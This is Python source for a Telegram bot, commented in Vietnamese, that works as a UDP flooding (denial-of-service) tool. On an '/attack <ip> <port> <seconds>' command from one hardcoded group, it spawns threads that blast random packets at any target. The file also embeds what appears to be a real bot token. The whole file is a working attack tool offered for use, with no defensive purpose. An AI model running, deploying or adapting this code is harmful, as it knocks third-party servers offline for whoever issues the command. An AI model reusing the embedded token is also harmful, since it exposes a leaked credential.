
import telebot
import threading
import time
import socket
import random

# === Cấu hình ===
TOKEN = "8064257148:AAH6DfA-DrE_pS60OBfOj1JsDYOKKdLtmdc"
GROUP_ID = -1002149794790

bot = telebot.TeleBot(TOKEN)

def is_from_group(message):
    return message.chat.type in ['group', 'supergroup'] and message.chat.id == GROUP_ID

def udp_attack(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1024)
    while time.time() < timeout:
        try:
            sock.sendto(bytes_data, (ip, port))
        except:
            pass

@bot.message_handler(commands=['start'])
def start(message):
    if not is_from_group(message):
        return
    bot.reply_to(message, "Chào bạn! Gửi lệnh: /attack <ip> <port> <thời_gian>")

@bot.message_handler(commands=['myid'])
def myid(message):
    if not is_from_group(message):
        return
    bot.reply_to(message, f"ID của bạn là: `{message.from_user.id}`", parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if not is_from_group(message):
        return
    try:
        parts = message.text.split()
        if len(parts) != 4:
            raise ValueError("Thiếu tham số.")
        _, ip, port, duration = parts
        port = int(port)
        duration = int(duration)
        bot.reply_to(message, f"Đang gửi UDP tới {ip}:{port} trong {duration} giây.")
        thread = threading.Thread(target=udp_attack, args=(ip, port, duration))
        thread.start()
    except:
        bot.reply_to(message, "Sai cú pháp. Dùng: /attack <ip> <port> <thời_gian>\nVí dụ: /attack 1.2.3.4 27015 10")

print("Bot đang chạy...")
bot.infinity_polling()
